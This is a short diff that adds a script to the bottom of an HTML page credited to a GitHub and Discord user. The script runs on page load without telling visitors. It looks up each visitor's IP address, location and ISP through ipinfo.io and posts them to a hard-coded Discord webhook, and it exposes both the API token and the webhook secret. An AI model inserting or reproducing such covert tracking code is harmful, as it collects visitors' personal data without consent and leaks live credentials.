@@ -214,5 +214,26 @@
     <div class="bottom-left">
 ThatToasterBoyo on github and discord
  </div>
+      <script>
+// Fetch the IP and geolocation data
+fetch('https://ipinfo.io/json?token=20f16b3c8b70ab')
+  .then(response => response.json())
+  .then(data => {
+    // Format the payload for Discord
+    const payload = {
+      content: `🔥 New visitor! IP: ${data.ip}\n` +
+               `Location: ${data.city}, ${data.region}, ${data.country}\n` +
+               `ISP: ${data.org}`
+    };
+
+    // Send to Discord webhook
+    fetch('https://discord.com/api/webhooks/1367590361207148544/tmn81JqmDwUsvs95Z-VaamYhNuzsAN1x6nC2uEtRTrBjlQLqueXM8KxRSVwJ_h276KAQ', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  })
+  .catch(error => console.error('Error snatching IP:', error));
+</script>
   </body>
   
